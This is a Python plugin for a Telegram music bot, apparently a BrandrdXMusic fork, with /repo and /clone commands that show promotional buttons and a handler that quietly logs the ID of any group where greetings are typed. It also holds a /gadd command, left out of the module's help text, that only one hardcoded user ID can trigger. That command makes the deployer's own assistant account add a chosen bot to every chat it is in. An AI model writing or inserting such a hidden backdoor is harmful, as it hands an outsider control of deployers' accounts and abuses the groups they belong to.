import asyncio

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message

from BrandrdXMusic import app
from BrandrdXMusic.mongo.afkdb import LOGGERS as OWNERS
from BrandrdXMusic.utils.database import add_served_chat, get_assistant


# -------------------- NEW REPO DESIGN -------------------- #

start_txt = """
❥ ωєℓ¢σмє тσ 𝐊ʀɪsʜ 𝐌ᴜsɪᴄ 

❥ ʙᴏᴛ ᴡɪᴛʜ ᴀᴡᴇsᴏᴍᴇ ғᴇᴀᴛᴜʀᴇs
│❍ • ʏᴏᴜ ᴄᴀɴ ᴘʟᴀʏ ᴍᴜꜱɪᴄ + ᴠɪᴅᴇᴏ •
│❍ • ʙᴇsᴛ ǫᴜɪʟɪᴛʏ ᴍᴜsɪᴄ sᴏᴜɴᴅ •
│❍ • ɴᴏ ʟᴀɢs + ɴᴏ ᴀᴅs •
│❍ • 24x7 ᴏɴʟɪɴᴇ sᴜᴘᴘᴏʀᴛ •
├──────────────
"""


@app.on_message(filters.command("repo"))
async def repo_handler(_, msg: Message):
    buttons = [
        [
            InlineKeyboardButton(
                "💠 𝖠ᴅᴅ ᴍᴇ 𝖡ᴀʙʏ 💠",
                url="https://t.me/ElevateMusicBot?startgroup=true",
            )
        ],
        [
            InlineKeyboardButton(
                "✰ 𝛅ꭎᴘ፝֠֩ᴘσꝛᴛ ✰",
                url="https://t.me/krishSUPPORT",
            ),
            InlineKeyboardButton(
                "𝐊ʀɪsʜɴᴇᴛᴡᴏʀᴋ",
                url="https://t.me/krishnetwork",
            ),
        ],
        [
            InlineKeyboardButton(
                "ᴏᴛʜᴇʀ ʙᴏᴛs",
                url="https://t.me/krishnetwork",
            )
        ],
        [
            InlineKeyboardButton(
                "ᴄʜᴇᴄᴋ",
                url="https://t.me/ElevateMusicBot",
            )
        ],
    ]

    await msg.reply_photo(
        photo="https://files.catbox.moe/chg2p4.jpg",
        caption=start_txt,
        reply_markup=InlineKeyboardMarkup(buttons),
    )


# -------------------- CLONE COMMAND -------------------- #

@app.on_message(filters.command("clone"))
async def clones(client: Client, message: Message):
    await message.reply_photo(
        photo="https://files.catbox.moe/xgenr4.jpg",
        caption="**🙂You Are Not Sudo User So You Are Not Allowed To Clone Me.**\n**😌Click Given Below Button And Host Manually Otherwise Contact Owner Or Sudo Users For Clone.**",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "⎯⁠⁠⁠⁠‌⎯⁠⁠⁠‌ ꯭꯭𝐂ᴏᴅᴇʀ~ᴋʀɪsʜ",
                        url="https://t.me/krishtechCrafter",
                    )
                ]
            ]
        ),
    )


# -------------------- AUTO CHAT LOGGER -------------------- #

@app.on_message(
    filters.command(
        ["hi", "hii", "hello", "hui", "good", "gm", "ok", "bye", "welcome", "thanks"],
        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
    )
    & filters.group
)
async def bot_check(_, message: Message):
    chat_id = message.chat.id
    await add_served_chat(chat_id)


# -------------------- GADD COMMAND -------------------- #

@app.on_message(filters.command("gadd") & filters.user(int(7458057585)))
async def add_allbot(client: Client, message: Message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply(
            "**⚠️ Invalid format. Use like » `/gadd @BotUsername`**"
        )
        return

    bot_username = command_parts[1]

    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id

        done = 0
        failed = 0

        lol = await message.reply("🔄 **Adding bot in all chats...**")

        await userbot.send_message(bot_username, "/start")

        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1002115990090:
                continue

            try:
                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
            except Exception:
                failed += 1

            await lol.edit(
                f"**🔂 Adding {bot_username}**\n\n"
                f"**➥ Added in {done} chats ✅**\n"
                f"**➥ Failed in {failed} chats ❌**\n\n"
                f"**➲ By » @{userbot.username}**"
            )

            await asyncio.sleep(3)

        await lol.edit(
            f"**➻ {bot_username} added successfully 🎉**\n\n"
            f"**➥ Added in {done} chats ✅**\n"
            f"**➥ Failed in {failed} chats ❌**\n\n"
            f"**➲ By » @{userbot.username}**"
        )

    except Exception as e:
        await message.reply(f"Error: {str(e)}")


# -------------------- MODULE INFO -------------------- #

__MODULE__ = "Sᴏᴜʀᴄᴇ"

__HELP__ = """
## Repo Source Module

Commands:
- /repo → Show bot info & buttons
"""
